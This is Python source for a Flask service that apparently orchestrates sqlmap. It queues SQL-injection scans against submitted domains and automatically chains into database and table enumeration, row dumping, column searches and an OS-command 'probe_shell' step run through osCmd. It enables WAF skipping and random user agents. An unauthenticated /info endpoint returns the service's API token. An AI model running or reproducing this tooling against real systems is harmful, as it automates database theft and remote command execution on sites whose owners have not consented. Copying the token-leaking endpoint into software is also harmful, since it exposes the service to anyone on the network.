def build_follow_up_options(record, action, action_args):
    profile = get_fallback_profile(action_args.get("fallback_index", 0))
    base = {
        "requestFile": os.path.abspath(record["request_file"]),
        "outputDir": os.path.abspath(record["scan_root"]),
        "batch": True,
        "forceSSL": record["force_ssl"],
        "level": DEFAULT_SQLMAP_LEVEL,
        "risk": DEFAULT_SQLMAP_RISK,
        "randomAgent": True,
        "smart": True,
        "parseErrors": True,
        "keepAlive": True,
        "skipWaf": True,
        "threads": DEFAULT_SQLMAP_THREADS,
        "timeout": DEFAULT_SQLMAP_TIMEOUT,
        "retries": DEFAULT_SQLMAP_RETRIES,
    }
    base.update(profile.get("options", {}))
    if record.get("proxy"):
        base["proxy"] = record["proxy"]

    if action == "initial_scan":
        if action_args.get("technique"):
            base["technique"] = action_args["technique"]
        return base
    if action == "get_current_db":
        base["getCurrentDb"] = True
    elif action == "get_dbs":
        base["getDbs"] = True
    elif action == "get_tables":
        base["getTables"] = True
        if action_args.get("db"):
            base["db"] = action_args["db"]
    elif action == "get_columns":
        base["getColumns"] = True
        if action_args.get("db"):
            base["db"] = action_args["db"]
        if action_args.get("table"):
            base["tbl"] = action_args["table"]
    elif action == "dump_first_row":
        base["dumpTable"] = True
        base["dumpFormat"] = "SQLITE"
        base["limitStart"] = 1
        base["limitStop"] = 1
        if action_args.get("db"):
            base["db"] = action_args["db"]
        if action_args.get("table"):
            base["tbl"] = action_args["table"]
    elif action == "dump_table_data":
        base["dumpTable"] = True
        base["dumpFormat"] = "SQLITE"
        base["limitStart"] = int(action_args.get("limit_start") or 1)
        base["limitStop"] = int(action_args.get("limit_stop") or 20)
        if action_args.get("db"):
            base["db"] = action_args["db"]
        if action_args.get("table"):
            base["tbl"] = action_args["table"]
    elif action == "count_rows":
        base["count"] = True
        if action_args.get("db"):
            base["db"] = action_args["db"]
        if action_args.get("table"):
            base["tbl"] = action_args["table"]
    elif action == "search_column":
        base["search"] = True
        if action_args.get("db"):
            base["db"] = action_args["db"]
        if action_args.get("table"):
            base["tbl"] = action_args["table"]
        column_name = str(action_args.get("column") or "").strip()
        if not column_name:
            raise ValueError("column is required for search_column")
        base["col"] = column_name
    elif action == "search":
        base["search"] = True
        search_kind = str(action_args.get("search_kind") or "").strip().lower()
        search_query = str(action_args.get("search_query") or "").strip()
        if not search_query:
            raise ValueError("search_query is required for search")
        if search_kind == "database":
            base["db"] = search_query
        elif search_kind == "table":
            base["tbl"] = search_query
            if action_args.get("db"):
                base["db"] = action_args["db"]
        elif search_kind == "column":
            base["col"] = search_query
            if action_args.get("db"):
                base["db"] = action_args["db"]
            if action_args.get("table"):
                base["tbl"] = action_args["table"]
        elif search_kind == "data":
            base["search"] = False
            raise ValueError("data search is not supported by sqlmap --search")
        else:
            raise ValueError("unsupported search_kind")
    elif action == "probe_shell":
        base["osCmd"] = action_args.get("command") or "echo sqlmap"
    else:
        raise ValueError(f"Unsupported action '{action}'")

    if action_args.get("technique"):
        base["technique"] = action_args["technique"]

    return base


def build_automation_job(root_task_id, action, action_args=None):
    record = scan_records.get(root_task_id)
    if not record:
        return None
    sqlmap_task_id = create_follow_up_sqlmap_task()
    scan_data = build_follow_up_options(record, action, action_args or {})
    return {
        "root_task_id": root_task_id,
        "sqlmap_task_id": sqlmap_task_id,
        "scan_data": scan_data,
        "action": action,
        "action_args": action_args or {},
    }


def build_next_automation_job(root_task_id, snapshot):
    record = scan_records.get(root_task_id)
    if not record or not record["automation"]["enabled"]:
        return None
    if snapshot.get("running") or snapshot.get("queued"):
        return None
    if not snapshot.get("content", {}).get("techniques"):
        return None

    completed = set(record["automation"].get("completed", []))
    current_db = snapshot.get("content", {}).get("current_db")
    if "get_current_db" not in completed and not current_db:
        return build_automation_job(root_task_id, "get_current_db")

    database_name = current_db or get_first_database(snapshot)
    tables = snapshot.get("content", {}).get("tables")
    if "get_tables" not in completed and database_name and not (isinstance(tables, dict) and tables.get(database_name)):
        return build_automation_job(root_task_id, "get_tables", {"db": database_name})

    if "probe_shell" not in completed:
        return build_automation_job(root_task_id, "probe_shell")

    return None


def build_scan_summary(record):
    snapshot = build_scan_snapshot(record["root_task_id"], include_logs=False)
    return {
        "task_id": snapshot.get("task_id"),
        "current_sqlmap_task_id": snapshot.get("current_sqlmap_task_id"),
        "domain": snapshot.get("domain"),
        "vuln_id": snapshot.get("vuln_id"),
        "status": snapshot.get("status"),
        "phase": snapshot.get("phase"),
        "latest_action": snapshot.get("latest_action"),
        "dbms": snapshot.get("session", {}).get("dbms"),
        "os": snapshot.get("session", {}).get("os"),
        "current_db": snapshot.get("content", {}).get("current_db"),
        "created_at": snapshot.get("created_at"),
        "updated_at": snapshot.get("updated_at"),
    }


@app.route("/info", methods=["GET"])
def get_info():
    return jsonify(
        {
            "api_token": API_TOKEN,
            "max_concurrent": MAX_CONCURRENT_SCANS,
            "sqlmapapi_url": sqlmapapi_base(),
            "agent_port": FLASK_PORT,
            "version": AGENT_VERSION,
        }
    )


@app.route("/status", methods=["GET"])
@require_auth
def get_status():
    with queue_lock:
        running_count = len(running_tasks)
        queued_count = len(task_queue)
    return jsonify(
        {
            "running_count": running_count,
            "max_concurrent": MAX_CONCURRENT_SCANS,
            "queued_count": queued_count,
            "scan_count": len(scan_records),
            "version": AGENT_VERSION,
        }
    )


@app.route("/scans", methods=["GET"])
@require_auth
def list_scans():
    scans = [build_scan_summary(record) for record in scan_records.values()]
    scans.sort(key=lambda item: item.get("created_at", 0), reverse=True)
    return jsonify({"scans": scans})


@app.route("/scan", methods=["POST"])
@require_auth
def start_scan():
    data = request.json or {}
    domain = data.get("domain")
    vuln_id = data.get("vuln_id")
    request_data = data.get("request_data")
    force_ssl = bool(data.get("force_ssl", False))
    proxy = data.get("proxy") or ""

    if not all([domain, vuln_id, request_data]):
        return jsonify({"error": "Missing required fields"}), 400

    scan_name = sanitize_path_component(f"{domain}.{vuln_id}")
    scan_root = os.path.join(OUTPUT_DIR, "scans", scan_name)
    os.makedirs(scan_root, exist_ok=True)
    request_file = os.path.join(scan_root, "request.txt")
    with open(request_file, "wt", encoding="utf8", newline="") as file_handle:
        file_handle.write(request_data)

    root_task_id = create_follow_up_sqlmap_task()
    record = create_record(root_task_id, domain, vuln_id, request_file, scan_root, force_ssl)
    record["proxy"] = proxy
    persist_record_metadata(record)
    scan_data = build_follow_up_options(scan_records[root_task_id], "initial_scan", {})
    ok, message, _ = queue_job(root_task_id, root_task_id, scan_data, "initial_scan")
    status_code = 202 if message == "Task queued" else 200
    if not ok:
        return jsonify({"error": message}), 409
    return jsonify({"message": message, "task_id": root_task_id}), status_code


@app.route("/scan/<root_task_id>", methods=["GET"])
@require_auth
def get_scan(root_task_id):
    snapshot = build_scan_snapshot(root_task_id)
    if snapshot.get("error"):
        return jsonify(snapshot), 404
    return jsonify(snapshot)


@app.route("/scan/<root_task_id>/action", methods=["POST"])
@require_auth
def run_action(root_task_id):
    record = scan_records.get(root_task_id)
    if not record:
        return jsonify({"error": "Task not found"}), 404

    data = request.json or {}
    action = data.get("action")
    if action not in ("get_current_db", "get_dbs", "get_tables", "get_columns", "dump_first_row", "dump_table_data", "search_column", "probe_shell", "search", "count_rows"):
        return jsonify({"error": "Unsupported action"}), 400

    snapshot = build_scan_snapshot(root_task_id, include_logs=False)
    action_args = {
        "db": data.get("db") or get_first_database(snapshot),
        "table": data.get("table") or get_first_table(snapshot, data.get("db") or get_first_database(snapshot)),
        "command": data.get("command"),
        "column": data.get("column"),
        "search_kind": data.get("search_kind"),
        "search_query": data.get("search_query"),
        "limit_start": data.get("limit_start"),
        "limit_stop": data.get("limit_stop"),
    }

    try:
        sqlmap_task_id = create_follow_up_sqlmap_task()
        scan_data = build_follow_up_options(record, action, action_args)
    except Exception as ex:
        return jsonify({"error": str(ex)}), 400

    ok, message, _ = queue_job(root_task_id, sqlmap_task_id, scan_data, action, action_args)
    if not ok:
        return jsonify({"error": message}), 409
    status_code = 202 if message == "Task queued" else 200
    return jsonify({"message": message, "task_id": root_task_id, "action": action, "sqlmap_task_id": sqlmap_task_id}), status_code


@app.route("/scan/<root_task_id>/search", methods=["GET"])
@require_auth
def search_scan(root_task_id):
    snapshot = build_scan_snapshot(root_task_id, include_logs=False)
    if snapshot.get("error"):
        return jsonify(snapshot), 404
    query = request.args.get("q", "")
    kind = request.args.get("kind", "")
    results = build_search_results(snapshot.get("tree", {}), query, kind)
    return jsonify({"task_id": root_task_id, "query": query, "kind": kind, "results": results})


@app.route("/scan/<root_task_id>/proxy", methods=["PUT"])
@require_auth
def update_scan_proxy(root_task_id):
    record = scan_records.get(root_task_id)
    if not record:
        return jsonify({"error": "Task not found"}), 404
    data = request.json or {}
    proxy = (data.get("proxy") or "").strip()
    record["proxy"] = proxy
    refresh_runtime_proxy(root_task_id)
    persist_record_metadata(record)
    return jsonify(
        {
            "message": "proxy updated",
            "task_id": root_task_id,
            "proxy": proxy,
            "runtime_proxy": record.get("runtime_proxy", ""),
            "runtime_proxy_file": record.get("runtime_proxy_file", ""),
        }
    )


@app.route("/scan/<root_task_id>/request", methods=["PUT"])
@require_auth
def update_scan_request(root_task_id):
    record = scan_records.get(root_task_id)
    if not record:
        return jsonify({"error": "Task not found"}), 404
    data = request.json or {}
    request_content = data.get("request_content")
    if request_content is None:
        return jsonify({"error": "request_content is required"}), 400
    request_file = record.get("request_file")
    if not request_file:
        return jsonify({"error": "request file not found"}), 400
    os.makedirs(os.path.dirname(os.path.abspath(request_file)), exist_ok=True)
    with open(request_file, "wt", encoding="utf8", newline="") as file_handle:
        file_handle.write(request_content)
    record["updated_at"] = now_ts()
    persist_record_metadata(record)
    return jsonify(
        {
            "message": "request updated",
            "task_id": root_task_id,
            "request_file": request_file,
            "request_content": read_text_file(request_file),
        }
    )


@app.route("/data/<root_task_id>", methods=["GET"])
@require_auth
def get_data(root_task_id):
    snapshot = build_scan_snapshot(root_task_id, include_logs=False)
    if snapshot.get("error"):
        return jsonify(snapshot), 404
    return jsonify(
        {
            "success": True,
            "data": snapshot.get("content", {}).get("raw", {}),
            "errors": snapshot.get("errors", []),
            "session": snapshot.get("session", {}),
        }
    )


if __name__ == "__main__":
    recover_scan_records()
    app.run(host="0.0.0.0", port=FLASK_PORT)
